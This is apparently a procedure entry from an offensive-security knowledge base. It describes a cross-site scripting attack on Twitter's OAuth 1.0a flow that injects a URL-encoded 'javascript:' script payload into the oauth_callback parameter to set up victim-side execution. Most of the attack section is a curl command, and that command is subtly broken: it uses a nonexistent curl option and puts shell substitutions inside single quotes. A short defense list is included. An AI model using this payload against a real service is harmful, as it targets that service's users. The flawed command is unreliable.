---
id: proc-twitter-oauth-token-xss
tags:
  - xss
  - oauth
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-request-token-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:35.725Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Obtain-Malicious-Request-Token-with-XSS-Callback

## Summary

This procedure crafts a malicious OAuth request token by injecting an XSS payload into the oauth_callback parameter, exploiting lack of sanitization in Twitter's API to prepare for JavaScript execution on user authorization.

## Description

In the OAuth 1.0a flow, the oauth_callback is used for redirection after authorization. By injecting a javascript: URI with HTML/JS payload (URL-encoded), the parameter renders unsanitized on the post-authorization redirect page, leading to XSS. This targets api.twitter.com/oauth/request_token and requires app credentials. Prerequisites include a registered Twitter app and OAuth signing knowledge.

## Requirements

1. Twitter developer app with consumer key and secret
2. Ability to generate OAuth signatures (HMAC-SHA1)
3. Network access to api.twitter.com over HTTPS

## Defense

Defensive measures and detection strategies:

- Sanitize oauth_callback to whitelist only http/https URLs
- Implement CSP to block inline scripts and javascript: protocols
- Monitor for anomalous callback parameters in logs

## Objectives

1. Acquire a request token tainted with XSS payload
2. Set up for victim-side execution
3. Validate payload survival through token issuance

## Instructions

### Step 1: Prepare OAuth Parameters

**Context**: Generate required OAuth headers and encode the malicious callback payload.

**Command** ([[commands/curl-request-token-xss]]):
```bash
curl -X POST 'https://api.twitter.com/oauth/request_token' \
  -d 'oauth_consumer_key=YOUR_CONSUMER_KEY' \
  -d 'oauth_signature_method=HMAC-SHA1' \
  -d 'oauth_timestamp=$(date +%s)' \
  -d 'oauth_nonce=$(openssl rand -hex 32)' \
  -d 'oauth_version=1.0' \
  -d 'oauth_callback=javascript%3A%2F%2F%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E' \
  --oauth-signature 'BASE64_ENCODED_HMAC_SHA1_SIGNATURE'
```

> This sends the request with the encoded payload (javascript://"><script>alert(document.domain)</script>). Expected output: oauth_token=TOKEN&oauth_token_secret=SECRET&oauth_callback_confirmed=true.

### Step 2: Verify Token Issuance

**Context**: Inspect response to ensure token is issued and payload is accepted.

No command; parse the curl output for oauth_token.

> Success if token received; failure if API rejects callback.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-request-token-xss]]

## Tools Used


## Tags

- [[xss]]
- [[oauth]]
